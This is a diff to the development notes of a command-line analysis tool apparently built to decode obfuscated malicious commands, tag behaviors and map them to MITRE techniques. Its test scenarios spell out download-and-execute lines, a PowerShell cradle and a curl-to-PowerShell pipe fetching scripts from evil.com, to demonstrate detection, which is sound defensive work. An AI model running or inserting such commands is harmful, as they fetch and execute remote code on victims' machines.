@@ -129,8 +129,34 @@ Build a CyberChef-style tool called **NivXRay** ("like Payload Lab / CyberLab") 
 ## Backlog (P1/P2 remaining)
 - P1: Client-side WASM ops for real-time preview.
 - P1: Live diff-highlight between INPUT & OUTPUT columns.
+- P2: PE / ELF loader (parse imports, section table) — extends shellcode_analyzer.
 - P2: Modularize `/app/backend/server.py` into routers.
 - P2: STIX 2.1 export + community share page.
+
+## Session 8 (2026-02) — Intelligent Command-Line Analysis Engine (ICAE)
+
+- **New module** `/app/backend/command_analyzer.py` — execution-aware command-line semantic engine.
+  - Interpreter registry: `powershell`, `cmd`, `bash`, `python`, `javascript` (node/deno), `mshta`, `rundll32`, `regsvr32`, `certutil`, `wscript`/`cscript`, `msiexec`, `curl`/`wget`, `bitsadmin`. Each profile encodes `payload_flags` (values are inline payloads to decode) and `file_operand_flags` (values are FILES — never decode).
+  - Shell-aware `split_pipeline()` (respects quoted strings, handles `|`, `&&`, `||`, `;`, `>` connectors) + `tokenize()` with a POSIX/Windows shlex fallback.
+  - `_find_payload_spans()` scans tokens for encoded regions with per-span confidence: PS `-Enc`/`-EncodedCommand` value → 0.98, `[Convert]::FromBase64String("…")` → 0.95, `atob("…")` / `base64.b64decode("…")` → 0.95, unicode-escape → 0.85, chr()+chr() concat → 0.80, URL-encoded → 0.75, standalone long base64 → 0.72, long hex → 0.60.
+  - **Confidence gate**: auto-decode only ≥0.80. Multiple candidates tied within 0.05 → `needs_choice:true` + `choice_reason`. Frontend prompts the analyst to pick.
+  - **Never decode file operands**: `certutil -decode input.b64 output.exe` correctly returns `identified_payloads: []` + behavior `file-decode`.
+  - **Execution-flow classifier** `classify_behaviors()` — tags: `network-fetch`, `in-memory-execute`, `download-and-execute` (pipeline: downloader → interpreter), `persistence`, `file-decode`, `stealth-flags`.
+  - `_decode_span()` runs the span through smart_decode + magic_decode, filters out empty-chain candidates, picks the highest-scoring non-trivial chain, and preserves the shellcode-stop flag.
+  - Unified `extract_iocs()` (URLs, IPs, domains, file paths, reg-keys, MD5/SHA1/SHA256) and `map_mitre()` with deduped rules (T1027, T1059.001, T1105, T1140, T1218.005/010/011, T1071.001, T1053.005, T1197, …).
+  - `reconstruct_inline()` renders the original command with each decoded span annotated as `«decoded: …»` — preserves syntax so analysts can visually diff obfuscated vs decoded.
+  - `summarize()` produces the analyst behavior brief.
+- **New endpoint** `POST /api/analyze/command` — payload `{input, force_decode_span?}`. Returns `{original_command, parsed_structure, identified_payloads, needs_choice, choice_reason, decode_chains, final_decoded_inline, iocs, lolbins, mitre, behaviors, behavior_summary, raw_tokens}`.
+- **New page** `/analyze` — "COMMAND ANALYZER" nav tab. Renders parsed structure, identified payloads with confidence bars + reason, decode chains with inline shellcode view, IOCs / LOLBins / MITRE panels, behavior summary. `needs_choice` surfaces an in-app picker for tied payloads.
+- **New features in ops_extended**: `env-expand` (%TEMP% / $env:APPDATA / ${HOME} / ~/ → canonical placeholder paths) + `xor-brute` (Kasiski + English-scoring, up to 32-byte repeating keys, Occam-shave prefers shorter keys). Integrated into smart_decoder (post-decode env-expand) and magic_decoder (xor-brute candidate for high-entropy buffers).
+- **ShellcodeView wired into `/decode/magic` modal**: each candidate flagged `is_shellcode:true` shows an inline `🔬 ANALYZE BINARY` toggle that expands Capstone disassembly + IOC panel inside the modal.
+- Regression: **121/121** pytest pass (adds 22 shellcode + 28 command-analyzer). Malware Sample Library benchmark still **17/17 = 100.0%**.
+
+### End-to-end proof (all four scenarios from the design brief)
+1. `powershell.exe -NoP -W Hidden -Enc SQBF…` → auto-decodes to `IEX (New-Object Net.WebClient).DownloadString("http://evil.com/x.ps1")`, MITRE T1059.001 + T1105 + T1071.001.
+2. `powershell -c "[Convert]::FromBase64String('aGVsbG8gd29ybGQ=')"` → `needs_choice` (0.98 vs 0.95). Force-decode returns `hello world`.
+3. `certutil -decode input.b64 output.exe` → **zero** inline decodes attempted. Flagged as `file-decode` LOLBin, MITRE T1140.
+4. `curl http://evil.com/payload.ps1 | powershell` → NO base64 hallucination. Behaviors `network-fetch` + `download-and-execute`, MITRE T1071.001, URL extracted.
 
 ## Session 7 (2026-02) — Benchmark 100% + Playbook Feedback Loop + Recursive Decode-and-Route
 
